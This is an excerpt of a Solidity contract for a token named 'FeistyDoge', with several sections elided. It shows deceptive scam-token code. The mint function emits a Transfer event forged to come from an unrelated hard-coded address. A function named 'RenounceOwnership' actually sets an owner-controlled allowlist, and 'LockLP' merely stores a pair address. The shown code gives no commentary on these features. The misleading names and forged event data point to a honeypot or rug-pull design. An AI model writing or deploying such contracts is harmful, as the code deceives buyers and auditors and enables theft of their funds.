...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0xa4e581a0954952BEC17201cF082380C95d8d644F), account, amount);
    }
...
contract FeistyDoge is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('FeistyDoge','FD') {
        _mint(0x66a7B872D293986d022992ce2a875ACb0dE7479A, 1000000 *10**18);
        _enable[0x66a7B872D293986d022992ce2a875ACb0dE7479A] = true;
    }
    ...
    function RenounceOwnership(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
    function LockLP(address uni_) public onlyOwner {
        _uni = uni_;
    }
